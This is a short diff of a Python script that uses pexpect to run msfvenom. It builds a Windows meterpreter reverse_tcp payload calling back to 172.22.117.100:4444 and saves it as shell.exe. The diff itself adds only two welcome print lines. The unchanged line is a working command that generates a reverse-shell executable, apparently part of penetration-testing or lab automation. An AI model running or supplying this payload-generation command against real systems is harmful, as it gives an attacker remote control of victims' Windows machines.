@@ -2,6 +2,8 @@
 import pexpect
 import os
 
+print ("INITIALISING")
+print ("WELCOME")
 #msfvenom
 process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
 process.expect('Final')
